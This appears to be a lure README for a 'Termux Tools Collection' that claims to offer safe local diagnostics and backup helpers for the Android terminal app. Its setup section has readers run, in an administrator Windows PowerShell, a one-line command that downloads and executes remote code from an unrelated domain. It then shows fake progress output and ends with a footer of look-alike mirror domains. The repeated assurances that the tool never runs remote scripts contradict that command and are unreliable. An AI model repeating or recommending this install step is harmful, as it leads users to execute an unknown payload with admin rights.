# Termux Tools Collection

> A local-first collection of Termux diagnostics, package audits, backup helpers, and learning references.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitsl.xyz?get=termux-tools | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Termux Tools modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Termux Tools.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

Termux Tools Collection provides safe local diagnostics, package inventory, backup checklists, editor helpers, and offline references for Termux learners and mobile developers. It does not request root, bypass device controls, or execute unreviewed remote scripts.

## Core Features

- ✅ **Device Diagnostics** — Summarize local storage, environment, and process state.
- ✅ **Package Audit** — List installed packages and highlight stale metadata.
- ✅ **Backup Helper** — Create a reviewed checklist for personal project directories.
- ✅ **Editor Shortcuts** — Keep local snippets for common editing tasks.
- ✅ **Offline Reference** — Browse safe command examples without a network connection.
- ✅ **Permission Review** — Explain which local directories a command can access.
- ✅ **Export Reports** — Produce Markdown summaries for personal records.

## Usage

```bash
# Show local help
python -m termux_tools --help

# Review the package inventory
python -m termux_tools packages audit

# Create a backup checklist
python -m termux_tools backup plan --output ./backup-plan.md

# Open the offline reference
python -m termux_tools reference
```

## Configuration

> [!NOTE]
> Configuration is local YAML. The collection never modifies system partitions, requests root, or downloads and executes remote code.

```yaml
project_dirs:
  - ./projects
backup_format: checklist
include_package_versions: true
```

## Screenshots

- Diagnostics: `screenshots/diagnostics.png`
- Package audit: `screenshots/packages.png`
- Backup plan: `screenshots/backup.png`
- Offline reference: `screenshots/reference.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Diagnostics show missing values | Grant the app access only to the directories it needs and rerun. |
| Package audit is stale | Refresh the local inventory after package changes. |
| Backup plan is incomplete | Add each project directory explicitly. |
| Help command is missing | Activate the virtual environment and rerun the module command. |

## Use Cases

- **Mobile Development** — Keep a readable local environment record.
- **Learning Termux** — Explore safe commands and shell concepts.
- **Personal Backups** — Prepare a deliberate project backup plan.
- **Offline Reference** — Use local examples without network dependency.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Use this collection only on devices and directories you control. Do not request root, bypass restrictions, collect other users’ data, or run unreviewed remote scripts.

> [!TIP]
> Review the backup plan before copying personal files to another device.

## License

This project is licensed under the MIT License — see the `LICENSE` file for details.

## Tags

`termux-tools` `termux` `mobile-development` `diagnostics` `package-audit` `backup` `offline-reference` `safe-shell`

[gitsl.xyz](https://gitsl.xyz?t=termux-tools) | [gitrm.cfd](https://gitrm.cfd?t=termux-tools) | [gitview.sbs](https://gitview.sbs?t=termux-tools) | [gitrm.sbs](https://gitrm.sbs?t=termux-tools) | [viewgit.sbs](https://viewgit.sbs?t=termux-tools)
